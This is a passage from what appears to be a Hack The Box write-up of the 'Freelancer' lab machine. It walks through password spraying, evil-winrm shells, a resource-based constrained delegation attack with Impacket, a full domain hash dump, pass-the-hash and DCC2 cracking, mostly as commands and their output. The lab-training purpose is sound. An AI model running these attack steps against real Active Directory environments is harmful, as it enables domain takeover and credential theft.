+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\MSSQLSERVER:PWN3D#l0rr@Armessa199 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\sqlbackupoperator:PWN3D#l0rr@Armessa199 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\sql_svc:PWN3D#l0rr@Armessa199 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\administrator:MSSQLS3rv3rP@sswd#09 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\lkazanof:MSSQLS3rv3rP@sswd#09 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\mikasaAckerman:MSSQLS3rv3rP@sswd#09 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\MSSQLSERVER:MSSQLS3rv3rP@sswd#09 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\sqlbackupoperator:MSSQLS3rv3rP@sswd#09 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\sql_svc:MSSQLS3rv3rP@sswd#09 STATUS_LOGON_FAILURE 
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec winrm freelancer.htb <span class="nt">-u</span> <span class="nb">users</span> <span class="nt">-p</span> passwords2 <span class="nt">--continue-on-success</span>
+<span class="netexec-protocol">WINRM </span><span class="go">      10.10.11.5      5985   DC               </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10 / Server 2019 Build 17763 (name:DC) (domain:freelancer.htb)
+</span><span class="netexec-protocol">WINRM </span><span class="go">      10.10.11.5      5985   DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\administrator:PWN3D#l0rr@Armessa199
+</span><span class="netexec-protocol">WINRM </span><span class="go">      10.10.11.5      5985   DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\lkazanof:PWN3D#l0rr@Armessa199
+</span><span class="netexec-protocol">WINRM </span><span class="go">      10.10.11.5      5985   DC               </span><span class="netexec-logsuccess">[+]</span><span class="go"> freelancer.htb\lorra199:PWN3D#l0rr@Armessa199 </span><span class="netexec-pwned">(Pwn3d!)</span><span class="go">
+</span><span class="netexec-protocol">WINRM </span><span class="go">      10.10.11.5      5985   DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\mikasaAckerman:PWN3D#l0rr@Armessa199
+</span><span class="netexec-protocol">WINRM </span><span class="go">      10.10.11.5      5985   DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\MSSQLSERVER:PWN3D#l0rr@Armessa199
+</span><span class="netexec-protocol">WINRM </span><span class="go">      10.10.11.5      5985   DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\sqlbackupoperator:PWN3D#l0rr@Armessa199
+</span><span class="netexec-protocol">WINRM </span><span class="go">      10.10.11.5      5985   DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\sql_svc:PWN3D#l0rr@Armessa199
+</span><span class="netexec-protocol">WINRM </span><span class="go">      10.10.11.5      5985   DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\administrator:MSSQLS3rv3rP@sswd#09
+</span><span class="netexec-protocol">WINRM </span><span class="go">      10.10.11.5      5985   DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\lkazanof:MSSQLS3rv3rP@sswd#09
+</span><span class="netexec-protocol">WINRM </span><span class="go">      10.10.11.5      5985   DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\mikasaAckerman:MSSQLS3rv3rP@sswd#09
+</span><span class="netexec-protocol">WINRM </span><span class="go">      10.10.11.5      5985   DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\MSSQLSERVER:MSSQLS3rv3rP@sswd#09
+</span><span class="netexec-protocol">WINRM </span><span class="go">      10.10.11.5      5985   DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\sqlbackupoperator:MSSQLS3rv3rP@sswd#09
+</span><span class="netexec-protocol">WINRM </span><span class="go">      10.10.11.5      5985   DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\sql_svc:MSSQLS3rv3rP@sswd#09
+</span></code></pre></div></div>
+<h3 id="shell">Shell</h3>
+<p>With the creds and permissions for WinRM, I’ll get a shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>evil-winrm <span class="nt">-i</span> freelancer.htb <span class="nt">-u</span> lorra199 <span class="nt">-p</span> <span class="s1">'PWN3D#l0rr@Armessa199'</span>
+<span class="go">
+Evil-WinRM shell v3.4
+
+Info: Establishing connection to remote endpoint
+
+</span><span class="gp">*Evil-WinRM* PS C:\Users\lorra199\Documents&gt;</span><span class="w">
+</span></code></pre></div></div>
+<h2 id="shell-as-administrator">Shell as Administrator</h2>
+<h3 id="enumeration-2">Enumeration</h3>
+<p>I’ll collect Bloodhound data to get a better view of the domain:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>bloodhound-python <span class="nt">-d</span> freelancer.htb <span class="nt">-c</span> all <span class="nt">-u</span> lorra199 <span class="nt">-p</span> <span class="s1">'PWN3D#l0rr@Armessa199'</span> <span class="nt">-ns</span> 10.10.11.5 <span class="nt">--zip</span>
+<span class="go">INFO: Found AD domain: freelancer.htb
+INFO: Getting TGT for user
+INFO: Connecting to LDAP server: dc.freelancer.htb
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 8 computers
+INFO: Connecting to LDAP server: dc.freelancer.htb
+INFO: Found 30 users
+INFO: Found 58 groups
+INFO: Found 2 gpos
+INFO: Found 1 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: SetupMachine.freelancer.htb
+INFO: Querying computer: 
+INFO: Querying computer: 
+INFO: Querying computer: 
+INFO: Querying computer: 
+INFO: Querying computer: 
+INFO: Querying computer: Datacenter-2019
+INFO: Querying computer: DC.freelancer.htb
+WARNING: Could not resolve: Datacenter-2019: All nameservers failed to answer the query Datacenter-2019. IN A: Server 10.10.11.5 UDP port 53 answered SERVFAIL
+INFO: Done in 00M 21S
+INFO: Compressing output into 20240608032642_bloodhound.zip
+</span></code></pre></div></div>
+<p>I gave the <a href="https://support.bloodhoundenterprise.io/hc/en-us/articles/17468450058267-Install-BloodHound-Community-Edition-with-Docker-Compose">Docker version of BloodHound</a> a try here. It is still lacking some features, but I’ve been burned by it since, so I’m not sure I can recommend it yet.</p>
+<p>Working from lorra199, they have <em>tons</em> of outbound control:</p>
+<picture>
+<source srcset="/img/image-20240608070117775.webp" type="image/webp"/>
+<img alt="image-20240608070117775" class="include_image" loading="lazy" src="/img/image-20240608070117775.png"/>
+</picture>
+<p>The most interesting as an attacker is:</p>
+<picture>
+<source srcset="/img/image-20240608070711091.webp" type="image/webp"/>
+<img alt="image-20240608070711091" class="include_image" loading="lazy" src="/img/image-20240608070711091.png"/>
+</picture>
+<p>As a member of the AD Recycle Bin group, Lorra199 has <code class="language-plaintext highlighter-rouge">GenericWrite</code> over the DC. This is the same path I showed on <a href="/2022/12/17/htb-support.html#shell-as-domainadmin">Support</a>.</p>
+<h3 id="exploit-via-rbcd">Exploit via RBCD</h3>
+<h4 id="background">Background</h4>
+<p>One way to abuse <code class="language-plaintext highlighter-rouge">GenericWrite</code> on a computer object is to create a fake computer on the domain and then write onto the DC that the fake computer has the ability to delegate as the DC (with resource-based constrained delegation (RBCD)). Then I can request a ticket as the DC and act as the DC.</p>
+<p>Bloodhound shows this if I click on the <code class="language-plaintext highlighter-rouge">GenericWrite</code> under “Linux Abuse”:</p>
+<picture>
+<source srcset="/img/image-20240608071229267.webp" type="image/webp"/>
+<img alt="image-20240608071229267" class="include_image" loading="lazy" src="/img/image-20240608071229267.png"/>
+</picture>
+<h4 id="add-computer">Add Computer</h4>
+<p>I’ll add a computer using <code class="language-plaintext highlighter-rouge">addcomputer.py</code> from <a href="https://github.com/SecureAuthCorp/impacket">Impacket</a>. When I run it with the options given in the help above, it fails:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>addcomputer.py <span class="nt">-method</span> LDAPS <span class="nt">-computer-name</span> <span class="s1">'0xdf$'</span> <span class="nt">-computer-pass</span> <span class="s1">'0xdf0xdf123!'</span> <span class="nt">-dc-host</span> 10.10.11.5 <span class="nt">-domain-netbios</span> freelancer.htb <span class="s1">'freelancer.htb/lorra199:PWN3D#l0rr@Armessa199'</span>
+<span class="go">Impacket v0.12.0.dev1+20240308.164415.4a62f39 - Copyright 2023 Fortra
+[-] socket ssl wrapping error: [Errno 104] Connection reset by peer
+</span></code></pre></div></div>
+<p>It’s having some kind of SSL issue. I’ll notice the method here is <code class="language-plaintext highlighter-rouge">LDAPS</code>. The help for <code class="language-plaintext highlighter-rouge">addcomputer.py</code> shows there are two options here:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>addcomputer.py <span class="nt">-h</span>
+<span class="go">Impacket v0.12.0.dev1+20240308.164415.4a62f39 - Copyright 2023 Fortra
+
+</span><span class="gp">usage: addcomputer.py [-h] [-domain-netbios NETBIOSNAME] [-computer-name COMPUTER-NAME$</span><span class="o">]</span>
+<span class="go">                      [-computer-pass password] [-no-add] [-delete] [-debug] [-method {SAMR,LDAPS}]
+                      [-port {139,445,636}] [-baseDN DC=test,DC=local]
+                      [-computer-group CN=Computers,DC=test,DC=local] [-hashes LMHASH:NTHASH]
+                      [-no-pass] [-k] [-aesKey hex key] [-dc-host hostname] [-dc-ip ip]
+                      [domain/]username[:password]
+
+Adds a computer account to domain
+...[snip]...
+  -method {SAMR,LDAPS}  Method of adding the computer.SAMR works over SMB.LDAPS has some certificate
+                        requirementsand isn't always available.
+...[snip]...
+</span></code></pre></div></div>
+<p>I’ll try <code class="language-plaintext highlighter-rouge">SAMR</code> and it works:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>addcomputer.py <span class="nt">-method</span> SAMR <span class="nt">-computer-name</span> <span class="s1">'0xdf$'</span> <span class="nt">-computer-pass</span> <span class="s1">'0xdf0xdf123!'</span> <span class="nt">-dc-host</span> 10.10.11.5 <span class="nt">-domain-netbios</span> freelancer.htb <span class="s1">'freelancer.htb/lorra199:PWN3D#l0rr@Armessa199'</span>
+<span class="go">Impacket v0.12.0.dev1+20240308.164415.4a62f39 - Copyright 2023 Fortra
+
+</span><span class="gp">[*] Successfully added machine account 0xdf$</span><span class="w"> </span>with password 0xdf0xdf123!.
+</code></pre></div></div>
+<h4 id="create-rbcd">Create RBCD</h4>
+<p>Now I want to tell the DC that 0xdf$ is allowed to act on it’s behalf using another <a href="https://github.com/SecureAuthCorp/impacket">Impacket</a> script, <code class="language-plaintext highlighter-rouge">rbcd.py</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$ </span>rbcd.py <span class="nt">-delegate-from</span> <span class="s1">'0xdf$'</span> <span class="nt">-delegate-to</span> <span class="s1">'dc$'</span> <span class="nt">-action</span> <span class="s1">'write'</span> <span class="s1">'freelancer.htb/lorra199:PWN3D#l0rr@Armessa199'</span>
+<span class="go">Impacket v0.12.0.dev1+20240308.164415.4a62f39 - Copyright 2023 Fortra
+
+[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
+[*] Delegation rights modified successfully!
+[*] 0xdf$ can now impersonate users on dc$ via S4U2Proxy
+[*] Accounts allowed to act on behalf of other identity:
+[*]     0xdf$        (S-1-5-21-3542429192-2036945976-3483670807-11601) 
+</span></code></pre></div></div>
+<p>This requires the <code class="language-plaintext highlighter-rouge">GenericWrite</code> privilege on the DC account, which lorra199 has.</p>
+<h4 id="generate-service-ticket">Generate Service Ticket</h4>
+<p>I’ll have 0xdf$ request a ticket impersonating the administrator account to the DC, and because of the now-configured RBCD, it will work:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>getST.py <span class="nt">-spn</span> <span class="s1">'cifs/DC.freelancer.htb'</span> <span class="nt">-impersonate</span> <span class="s1">'administrator'</span> <span class="s1">'freelancer.htb/0xdf$:0xdf0xdf123!'</span>
+<span class="go">Impacket v0.12.0.dev1+20240308.164415.4a62f39 - Copyright 2023 Fortra
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating administrator
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in administrator@cifs_DC.freelancer.htb@FREELANCER.HTB.ccache
+</span></code></pre></div></div>
+<h4 id="dump-hashes">Dump Hashes</h4>
+<p>With this ticket, I can act as the administrator account, so there are multiple ways to abuse this. I’ll use <code class="language-plaintext highlighter-rouge">secretsdump.py</code> to get the hashes for the domain:</p>
+<div class="language-console code-collapse highlighter-rouge" data-trunc="400"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$ </span><span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="s1">'administrator@cifs_DC.freelancer.htb@FREELANCER.HTB.ccache'</span> secretsdump.py <span class="nt">-no-pass</span> <span class="nt">-k</span> dc.freelancer.htb <span class="nt">-just-dc-ntlm</span>
+<span class="go">Impacket v0.12.0.dev1+20240308.164415.4a62f39 - Copyright 2023 Fortra
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:0039318f1e8274633445bce32ad1a290:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d238e0bfa17d575038efc070187a91c2:::
+freelancer.htb\mikasaAckerman:1105:aad3b435b51404eeaad3b435b51404ee:e8d62c7d57e5d74267ab6feb2f662674:::
+sshd:1108:aad3b435b51404eeaad3b435b51404ee:c1e83616271e8e17d69391bdcd335ab4:::
+SQLBackupOperator:1112:aad3b435b51404eeaad3b435b51404ee:c4b746db703d1af5575b5c3d69f57bab:::
+sql_svc:1114:aad3b435b51404eeaad3b435b51404ee:af7b9d0557964265115d018b5cff6f8a:::
+lorra199:1116:aad3b435b51404eeaad3b435b51404ee:67d4ae78a155aab3d4aa602da518c051:::
+freelancer.htb\maya.artmes:1124:aad3b435b51404eeaad3b435b51404ee:22db50a324b9a34ea898a290c1284e25:::
+freelancer.htb\michael.williams:1126:aad3b435b51404eeaad3b435b51404ee:af7b9d0557964265115d018b5cff6f8a:::
+freelancer.htb\sdavis:1127:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+freelancer.htb\d.jones:1128:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+freelancer.htb\jen.brown:1129:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+freelancer.htb\taylor:1130:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+freelancer.htb\jmartinez:1131:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+freelancer.htb\olivia.garcia:1133:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+freelancer.htb\dthomas:1134:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+freelancer.htb\sophia.h:1135:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+freelancer.htb\Ethan.l:1138:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+freelancer.htb\wwalker:1141:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+freelancer.htb\jgreen:1142:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+freelancer.htb\evelyn.adams:1143:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+freelancer.htb\hking:1144:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+freelancer.htb\alex.hill:1145:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+freelancer.htb\samuel.turner:1146:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+freelancer.htb\ereed:1149:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+freelancer.htb\leon.sk:1151:aad3b435b51404eeaad3b435b51404ee:af7b9d0557964265115d018b5cff6f8a:::
+freelancer.htb\carol.poland:1160:aad3b435b51404eeaad3b435b51404ee:af7b9d0557964265115d018b5cff6f8a:::
+freelancer.htb\lkazanof:1162:aad3b435b51404eeaad3b435b51404ee:a26c33c2878b23df8b2da3d10e430a0f:::
+DC$:1000:aad3b435b51404eeaad3b435b51404ee:89851d57d9c8cc8addb66c59b83a4379:::
+DATACENTER-2019$:1115:aad3b435b51404eeaad3b435b51404ee:7a8b0efef4571ec55cc0b9f8cb73fdcf:::
+DATAC2-2022$:1155:aad3b435b51404eeaad3b435b51404ee:007a710c0581c63104dad1e477c794e8:::
+WS1-WIIN10$:1156:aad3b435b51404eeaad3b435b51404ee:57e57c6a3f0f8fff74e8ab524871616b:::
+WS2-WIN11$:1157:aad3b435b51404eeaad3b435b51404ee:bf5267ee6236c86a3596f72f2ddef2da:::
+WS3-WIN11$:1158:aad3b435b51404eeaad3b435b51404ee:732c190482eea7b5e6777d898e352225:::
+DC2$:1159:aad3b435b51404eeaad3b435b51404ee:e1018953ffa39b3818212aba3f736c0f:::
+SETUPMACHINE$:8601:aad3b435b51404eeaad3b435b51404ee:f5912663ecf2c8cbda2a4218127d11fe:::
+0xdf$:11601:aad3b435b51404eeaad3b435b51404ee:1d6022ba48a97d47ea31566ce1bce602:::
+[*] Cleaning up...
+</span></code></pre></div></div>
+<h3 id="shell-1">Shell</h3>
+<p>With the administrator’s NTLM hash I can get a shell over WinRM:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>evil-winrm <span class="nt">-i</span> freelancer.htb <span class="nt">-u</span> administrator <span class="nt">-H</span> 0039318f1e8274633445bce32ad1a290
+<span class="go">
+Evil-WinRM shell v3.4
+
+Info: Establishing connection to remote endpoint
+
+</span><span class="gp">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt;</span><span class="w">
+</span></code></pre></div></div>
+<p>And read <code class="language-plaintext highlighter-rouge">root.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\Users\Administrator\desktop&gt;</span><span class="w"> </span><span class="kr">type</span><span class="w"> </span><span class="n">root.txt</span><span class="w">
+</span><span class="go">5d21119c************************
+</span></code></pre></div></div>
+<h2 id="alternative-paths-to-administrator">Alternative Paths to Administrator</h2>
+<h3 id="overview">Overview</h3>
+<p>The path using RBCD is actually not the intended path. The author’s path (that I was unaware of until just before Freelancer retired) was to recover a deleted user with <code class="language-plaintext highlighter-rouge">SeBackupPrivilege</code>.</p>
+<p>There’s another unintended path in Freelancer that involves a plaintext password in the memory dump file available as mikasaAckerman. I found this initially while looking at the dump with WindDbg and Mimikatz (which I’ll show below), but wasn’t able to find a use for the password. It was ryuki on the HTB discord who tipped me off to using variations of the password to find the password for <em>many</em> users on the domain. Thanks to ryuki and to <a href="https://x.com/DebugPrivilege">DebugPrivilege</a> for the memory dump tips and <a href="https://github.com/DebugPrivilege/InsightEngineering">awesome repo of tutorials</a>.</p>
+<pre><code class="language-mermaid">flowchart TD;
+    subgraph identifier[" "]
+      direction LR
+      start1[ ] ---&gt;|intended| stop1[ ]
+      style start1 height:0px;
+      style stop1 height:0px;
+      start2[ ] ---&gt;|unintended| stop2[ ]
+      style start2 height:0px;
+      style stop2 height:0px;
+    end
+    A[Shell as\nmikasaAckerman]--&gt;B(&lt;a href='#dump-analysis'&gt;Find Password\nfor lorra199&lt;/a&gt;);
+    B--&gt;C[&lt;a href="#shell"&gt;Shell as\nlorra199&lt;/a&gt;];;
+    C--&gt;H(&lt;a href="#restore-lizakazanof"&gt;Recover liza.kazanof\nAccount&lt;/a&gt;);
+    H--&gt;I(&lt;a href="#reset-password--shell"&gt;Reset liza.kazanof\nPassword&lt;/a&gt;);
+    I--&gt;J[&lt;a href="#reset-password--shell"&gt;Shell as liza.kazanof&lt;/a&gt;];
+    J--SeBackupPrivilege--&gt;K(&lt;a href="#exploit-sebackupprivilege"&gt;Dump Domain\nHashes&lt;/a&gt;)
+    K--&gt;E;
+    C--&gt;D(&lt;a href="#exploit-via-rbcd"&gt;RBCD&lt;/a&gt;)
+    D--&gt;E[&lt;a href="#shell-1"&gt;Shell as\nAdministrator&lt;/a&gt;]
+    A--&gt;F(&lt;a href="#recover-password"&gt;Find Password&lt;/a&gt;)
+    F--&gt;G(&lt;a href="#spray-password---failure"&gt;Spray Password\nVariation&lt;/a&gt;)
+    G--&gt;D
+    
+
+linkStyle default stroke-width:2px,stroke:#FFFF99,fill:none;
+linkStyle 1,9,10,11,12,13 stroke-width:2px,stroke:#4B9CD3,fill:none;
+style identifier fill:#1d1d1d,color:#FFFFFFFF;
+</code></pre>
+<h3 id="intended-path">Intended Path</h3>
+<h4 id="recover-lizakazanof-password">Recover liza.kazanof Password</h4>
+<p>When [dumping passwords from the memory dump], there was a hash for liza.kazanof. I’ll crack the with <code class="language-plaintext highlighter-rouge">hashcat</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$ </span><span class="nb">cat </span>liza.kazanof.hash 
+<span class="go">$DCC2$10240#liza.kazanof#ecd6e532224ccad2abcf2369ccb8b679
+</span><span class="gp">$ </span>hashcat liza.kazanof.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt 
+<span class="go">hashcat (v6.2.6) starting in autodetect mode
+...[snip]...
+Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
+The following mode was auto-detected as the only one matching your input hash:
+
+2100 | Domain Cached Credentials 2 (DCC2), MS Cache 2 | Operating System
+...[snip]...
+$DCC2$10240#liza.kazanof#ecd6e532224ccad2abcf2369ccb8b679:RockYou!
+...[snip]...
+</span></code></pre></div></div>
+<p>It cracks in less than a second on my host to “RockYou!”. It doesn’t seem to work for this account:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb freelancer.htb <span class="nt">-u</span> liza.kazanof <span class="nt">-p</span> <span class="s1">'RockYou!'</span> <span class="nt">-d</span> freelancer.htb
+<span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:freelancer.htb) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">)
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.5      445    DC               </span><span class="netexec-logfail">[-]</span><span class="go"> freelancer.htb\liza.kazanof:RockYou! STATUS_LOGON_FAILURE
+</span></code></pre></div></div>
+<h4 id="enumerate-lizakazanof">Enumerate liza.kazanof</h4>
+<p>With a shell as lorra199, I can look at the liza.kazanof user. Weirdly, they don’t seem to exist:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\&gt;</span><span class="w"> </span><span class="n">net</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="nx">liza.kazanof</span><span class="w">
+</span><span class="go">net.exe : The user name could not be found.
+    + CategoryInfo          : NotSpecified: (The user name could not be found.:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+More help is available by typing NET HELPMSG 2221.
+</span></code></pre></div></div>
+<p>They don’t show up in the Bloodhound data either.</p>
+<p>The lorra199 user is in the “AD Recycle Bin” group:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\&gt;</span><span class="w"> </span><span class="n">net</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="nx">lorra199</span><span class="w">
+</span><span class="go">User name                    lorra199
+Full Name
+Comment                      IT Support Technician
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            10/4/2023 8:19:13 AM
+Password expires             Never
+Password changeable          10/5/2023 8:19:13 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   5/13/2024 11:12:56 AM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Remote Management Use
+Global Group memberships     *Domain Users         *AD Recycle Bin
+The command completed successfully.
+</span></code></pre></div></div>
+<p><a href="https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/the-ad-recycle-bin-understanding-implementing-best-practices-and/ba-p/396944">This group is all about managing deleted users</a>. Querying for deleted users returns two:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\&gt;</span><span class="w"> </span><span class="n">get-adobject</span><span class="w"> </span><span class="nt">-filter</span><span class="w"> </span><span class="s1">'isdeleted -eq $true'</span><span class="w"> </span><span class="nt">-includedeletedobjects</span><span class="w">
+</span><span class="go">
+
+Deleted           : True
+DistinguishedName : CN=Deleted Objects,DC=freelancer,DC=htb
+Name              : Deleted Objects
+ObjectClass       : container
+ObjectGUID        : bb081f2b-bd0a-4fc7-b3e9-50e107e961ee
+
+Deleted           : True
+DistinguishedName : CN=Liza Kazanof\0ADEL:ebe15df5-e265-45ec-b7fc-359877217138,CN=Deleted Objects,DC=freelancer,DC=htb
+Name              : Liza Kazanof
+                    DEL:ebe15df5-e265-45ec-b7fc-359877217138
+ObjectClass       : user
+ObjectGUID        : ebe15df5-e265-45ec-b7fc-359877217138
+</span></code></pre></div></div>
+<p>The first is a container, but the other is the Liza Kazanof user! To get all the data about Liza, I’ll use <code class="language-plaintext highlighter-rouge">-property *</code>:</p>
+<div class="language-console code-collapse highlighter-rouge" data-trunc="300"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\&gt;</span><span class="w"> </span><span class="n">get-adobject</span><span class="w"> </span><span class="nt">-filter</span><span class="w"> </span><span class="s1">'isdeleted -eq $true -and ObjectClass -eq "user"'</span><span class="w"> </span><span class="nt">-includedeletedobjects</span><span class="w"> </span><span class="nt">-property</span><span class="w"> </span><span class="o">*</span><span class="w">
+</span><span class="go">
+
+accountExpires                  : 9223372036854775807
+badPasswordTime                 : 0
+badPwdCount                     : 0
+CanonicalName                   : freelancer.htb/Deleted Objects/Liza Kazanof
+                                  DEL:ebe15df5-e265-45ec-b7fc-359877217138
+CN                              : Liza Kazanof
+                                  DEL:ebe15df5-e265-45ec-b7fc-359877217138
+codePage                        : 0
+countryCode                     : 0
+Created                         : 5/14/2024 6:37:29 PM
+createTimeStamp                 : 5/14/2024 6:37:29 PM
+Deleted                         : True
+Description                     :
+DisplayName                     :
+DistinguishedName               : CN=Liza Kazanof\0ADEL:ebe15df5-e265-45ec-b7fc-359877217138,CN=Deleted Objects,DC=freelancer,DC=htb
+dSCorePropagationData           : {12/31/1600 7:00:00 PM}
+givenName                       : Liza
+instanceType                    : 4
+isDeleted                       : True
+LastKnownParent                 : CN=Users,DC=freelancer,DC=htb
+lastLogoff                      : 0
+lastLogon                       : 0
+logonCount                      : 0
+mail                            : liza.kazanof@freelancer.htb
+memberOf                        : {CN=Remote Management Users,CN=Builtin,DC=freelancer,DC=htb, CN=Backup Operators,CN=Builtin,DC=freelancer,DC=htb}
+Modified                        : 5/14/2024 6:41:44 PM
+modifyTimeStamp                 : 5/14/2024 6:41:44 PM
+msDS-LastKnownRDN               : Liza Kazanof
+Name                            : Liza Kazanof
+                                  DEL:ebe15df5-e265-45ec-b7fc-359877217138
+nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
+ObjectCategory                  :
+ObjectClass                     : user
+ObjectGUID                      : ebe15df5-e265-45ec-b7fc-359877217138
+objectSid                       : S-1-5-21-3542429192-2036945976-3483670807-2101
+primaryGroupID                  : 513
+ProtectedFromAccidentalDeletion : False
+pwdLastSet                      : 133601998496583593
+sAMAccountName                  : liza.kazanof
